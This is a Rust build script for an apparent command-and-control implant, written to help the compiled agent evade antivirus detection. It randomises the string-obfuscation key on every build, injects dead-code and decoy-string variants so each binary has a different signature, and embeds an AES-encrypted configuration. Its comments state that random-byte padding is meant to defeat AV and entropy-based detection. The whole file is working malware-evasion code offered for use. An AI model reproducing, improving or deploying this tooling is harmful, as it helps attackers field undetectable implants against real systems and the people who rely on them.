// ./build.rs
use std::env;
use std::fs::{self, File};
use std::io::{BufWriter, Write};
use std::path::Path;
use rand::{Rng, RngCore, thread_rng};
use rand::distributions::Alphanumeric;

fn main() {
    let out_dir = env::var("OUT_DIR").unwrap();

    // ── 0. Force rebuild on every invocation ──────────────────────────
    //
    // Emitting no `cargo:rerun-if-changed` directives causes cargo to
    // re-run build.rs on EVERY build — the documented default behaviour.
    //
    // DO NOT add `cargo:rerun-if-changed=build.rs` here. That directive
    // means "re-run only when build.rs itself changes", which is the
    // opposite of what we want. The previous comment was wrong about this.
    //
    // The cert directory and C2_BUILD_CONFIG env var are registered below
    // with their own targeted directives so cargo can still skip cert
    // regeneration and config embedding when nothing has changed. The
    // litcrypt key and junk-code sections, however, must be fresh every
    // time so that sequential builds produce binaries with different
    // signatures even from identical source.

    let mut rng = thread_rng();

    // ── 1. POLYMORPHISM: Random LitCrypt Key ──────────────────────────
    //
    // The key is 64 bytes drawn from the full printable-ASCII range
    // (0x21–0x7E) rather than just alphanumerics. This expands the
    // keyspace from 62^64 ≈ 2^381 to 94^64 ≈ 2^420 and avoids the
    // alphanumeric bias that makes brute-force enumeration marginally
    // cheaper.
    //
    // NOTE: lc!() only obfuscates strings explicitly wrapped with the
    // macro. High-value WinAPI strings in the evasion modules
    // (amsi.dll, AmsiScanBuffer, ntdll.dll, EtwEventWrite, etc.) must
    // be wrapped individually — build.rs cannot do that automatically.
    // See the coverage audit in docs/evasion.md.
    let litcrypt_key: String = (0..64)
        .map(|_| rng.gen_range(0x21u8..=0x7Eu8) as char)
        .collect();
    println!("cargo:rustc-env=LITCRYPT_ENCRYPT_KEY={}", litcrypt_key);

    // ── 2. POLYMORPHISM: Junk-code seed ──────────────────────────────
    //
    // A random 64-bit seed is embedded as a compile-time env var.
    // Agent modules that include junk_code.rs can use this to select
    // between pre-written dead-code variants at compile time via
    // cfg-like const evaluation, producing different branch layouts
    // and altering basic-block sequences without changing semantics.
    //
    // The seed drives three independent decisions:
    //   bits 0–15  : which junk function body variant is emitted
    //   bits 16–31 : how many dead iterations the spin loop runs
    //   bits 32–47 : which decoy error string variant is used
    //   bits 48–63 : reserved for future variant selection
    let junk_seed: u64 = rng.gen();
    let junk_variant    = (junk_seed & 0xFFFF) % 4;           // 0-3
    let junk_iterations = 1 + ((junk_seed >> 16) & 0xFF);     // 1-256 (dead loops)
    let junk_decoy_idx  = (junk_seed >> 32) & 0xFFFF;         // decoy string selector

    let junk_body = match junk_variant {
        0 => format!(
            // Variant 0: arithmetic spin — looks like a checksum or CRC stub
            "    let mut _acc: u64 = {seed};\n\
             for _i in 0u64..{iters} {{ _acc = _acc.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407); }}\n\
             if _acc == 0 {{ std::process::exit(1); }}",
            seed  = junk_seed,
            iters = junk_iterations,
        ),
        1 => format!(
            // Variant 1: byte array walk — looks like a hash or digest scan
            "    let _buf: [u8; {sz}] = [0u8; {sz}];\n\
             let mut _sum: u32 = {seed_lo};\n\
             for b in _buf.iter() {{ _sum = _sum.wrapping_add(*b as u32).rotate_left(3); }}\n\
             if _sum == u32::MAX {{ std::process::exit(1); }}",
            sz      = 16 + (junk_iterations as usize % 48),
            seed_lo = (junk_seed & 0xFFFFFFFF) as u32,
        ),
        2 => format!(
            // Variant 2: string length check — looks like an environment probe
            "    let _env_len: usize = option_env!(\"PATH\").map(|s| s.len()).unwrap_or({fallback});\n\
             if _env_len == 0 {{ std::process::exit(1); }}",
            fallback = 4 + (junk_iterations as usize % 12),
        ),
        _ => format!(
            // Variant 3: bitfield test — looks like a capability or flag check
            "    let _flags: u64 = {flags}u64;\n\
             if _flags & (1 << {bit}) != 0 && _flags == 0 {{ std::process::exit(1); }}",
            flags = junk_seed ^ 0xDEADBEEFCAFEBABE,
            bit   = junk_iterations % 64,
        ),
    };

    // Decoy string variants rotate through plausible-looking error messages
    // so the string pool differs across builds even without lc!() coverage.
    let decoy_strings = [
        "system initialisation failed",
        "runtime check error",
        "memory allocation failed",
        "configuration load error",
        "component initialisation failed",
        "security check failed",
        "service not available",
        "resource acquisition failed",
    ];
    let decoy = decoy_strings[(junk_decoy_idx as usize) % decoy_strings.len()];

    let junk_rs_path = Path::new(&out_dir).join("junk_code.rs");
    let junk_rs = format!(
        "/// Auto-generated dead code. Never called; exists solely to vary the\n\
         /// binary's function layout and basic-block graph across builds.\n\
         #[allow(dead_code)]\n\
         #[inline(never)]\n\
         fn __rcm_dead_{variant}() {{\n\
         {body}\n\
         }}\n\
         \n\
         #[allow(dead_code)]\n\
         static __RCM_DECOY: &str = \"{decoy}\";\n",
        variant = junk_variant,
        body    = junk_body,
        decoy   = decoy,
    );
    fs::write(&junk_rs_path, junk_rs).expect("Failed to write junk_code.rs");

    // ── 3. PLACEHOLDER CERTS ──────────────────────────────────────────
    println!("cargo:rerun-if-changed=certs/");
    let cert_dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("certs");
    fs::create_dir_all(&cert_dir).expect("Failed to create certs/");
    for name in &["ca.crt", "client.crt", "client.key.der", "server.crt", "server.key.der"] {
        let p = cert_dir.join(name);
        if !p.exists() {
            fs::write(&p, b"").expect(&format!("Failed to write placeholder {}", name));
            println!("cargo:warning=certs/{} is a placeholder — run ./gen_certs.sh before production builds", name);
        }
    }

    // ── 4. CONFIGURATION EMBEDDING ───────────────────────────────────
    println!("cargo:rerun-if-env-changed=C2_BUILD_CONFIG");
    let env_val = env::var("C2_BUILD_CONFIG").unwrap_or_default();

    let config_data = if env_val.is_empty() {
        serde_json::json!({ "bloat_mb": 0 })
    } else {
        serde_json::from_str(&env_val).expect("Invalid JSON in C2_BUILD_CONFIG")
    };

    let bloat_mb = config_data["bloat_mb"].as_u64().unwrap_or(0) as usize;

    let config_dest_path = Path::new(&out_dir).join("obfuscated_config.rs");
    let mut conf_code = String::new();

    if let (Some(key), Some(nonce), Some(cipher)) = (
        config_data["key_hex"].as_str(),
        config_data["nonce_hex"].as_str(),
        config_data["cipher_hex"].as_str(),
    ) {
        let key_bytes    = hex::decode(key).expect("Invalid Key Hex");
        let nonce_bytes  = hex::decode(nonce).expect("Invalid Nonce Hex");
        let cipher_bytes = hex::decode(cipher).expect("Invalid Cipher Hex");

        conf_code.push_str("use aes_gcm::{Aes256Gcm, KeyInit, aead::Aead};\n");
        conf_code.push_str(&format!("const CONFIG_KEY: [u8; 32] = {:?};\n", key_bytes));
        conf_code.push_str(&format!("const CONFIG_NONCE: [u8; 12] = {:?};\n", nonce_bytes));
        conf_code.push_str(&format!("const CONFIG_CIPHER: [u8; {}] = {:?};\n", cipher_bytes.len(), cipher_bytes));
        conf_code.push_str("pub fn get_config() -> String {\n");
        conf_code.push_str("    let key = aes_gcm::Key::<Aes256Gcm>::from_slice(&CONFIG_KEY);\n");
        conf_code.push_str("    let cipher = Aes256Gcm::new(key);\n");
        conf_code.push_str("    let nonce = aes_gcm::Nonce::from_slice(&CONFIG_NONCE);\n");
        conf_code.push_str("    let plaintext = match cipher.decrypt(nonce, CONFIG_CIPHER.as_ref()) {\n");
        conf_code.push_str("        Ok(p) => p,\n");
        conf_code.push_str("        Err(_) => std::process::exit(1),\n");
        conf_code.push_str("    };\n");
        conf_code.push_str("    match String::from_utf8(plaintext) {\n");
        conf_code.push_str("        Ok(s) => s,\n");
        conf_code.push_str("        Err(_) => std::process::exit(1),\n");
        conf_code.push_str("    }\n");
        conf_code.push_str("}\n");
    } else {
        conf_code.push_str("pub fn get_config() -> String { String::new() }\n");
    }
    fs::write(&config_dest_path, conf_code).expect("Failed to write config artifact");

    // ── 5. BLOAT ─────────────────────────────────────────────────────
    //
    // Previous implementation wrote null bytes ([0u8; 1024]), which
    // produces a distinctive zeroed region in .rodata that AV engines
    // recognise as artificial padding. Replaced with cryptographically
    // random bytes that have no identifiable structure.
    //
    // Stored as &[u8] rather than &str because arbitrary random bytes
    // are not valid UTF-8. The volatile read in use_bloat() forces the
    // linker to keep the section; the random content defeats simple
    // entropy-based detection by blending with encrypted data sections.
    let bloat_rs_path = Path::new(&out_dir).join("bloat_data.rs");
    let mut rs_code = String::new();

    if bloat_mb > 0 {
        let bloat_bin_path = Path::new(&out_dir).join("bloat.bin");
        let target_bytes   = bloat_mb * 1024 * 1024;
        let file           = File::create(&bloat_bin_path).unwrap();
        let mut writer     = BufWriter::new(file);
        let mut chunk      = [0u8; 4096];
        let mut written    = 0usize;
        while written < target_bytes {
            rng.fill_bytes(&mut chunk);
            let remaining = target_bytes - written;
            let to_write  = remaining.min(chunk.len());
            writer.write_all(&chunk[..to_write]).unwrap();
            written += to_write;
        }
        writer.flush().unwrap();

        rs_code.push_str("pub static BENIGN_DATA: &[u8] = include_bytes!(concat!(env!(\"OUT_DIR\"), \"/bloat.bin\"));\n");
        rs_code.push_str("pub fn use_bloat() { if !BENIGN_DATA.is_empty() { unsafe { std::ptr::read_volatile(&BENIGN_DATA[0]); } } }\n");
    } else {
        rs_code.push_str("pub fn use_bloat() {}\n");
    }
    fs::write(&bloat_rs_path, rs_code).unwrap();
}
